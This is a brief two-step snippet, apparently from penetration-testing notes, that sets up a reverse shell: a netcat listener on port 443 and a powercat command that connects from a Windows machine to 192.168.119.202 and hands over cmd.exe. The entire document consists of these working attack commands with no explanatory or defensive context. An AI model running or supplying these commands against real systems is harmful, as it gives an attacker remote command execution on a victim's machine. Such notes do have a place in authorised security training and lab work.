# 1) Spawn a listener to receive the reverse shell
```sh
LPORT=443
sudo nc -lnvp $LPORT
```

# 2) send reverse shell to remote host
```ps
powercat -c 192.168.119.202 -p 443 -e cmd.exe
```
